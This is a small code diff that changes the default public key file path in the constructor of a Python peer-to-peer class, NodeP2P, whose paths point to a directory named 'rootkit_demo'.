@@ -23,7 +23,7 @@ class NodeP2P(object):
 
     def __init__(
         self,
-        public_key_path: str = "/etc/rootkit_demo/public/public_key",
+        public_key_path: str = "/etc/rootkit_demo/public/source/public_key",
         private_key_path: str = "/etc/rootkit_demo/private_key",
         already_created_socket: socket.socket = None,
     ):
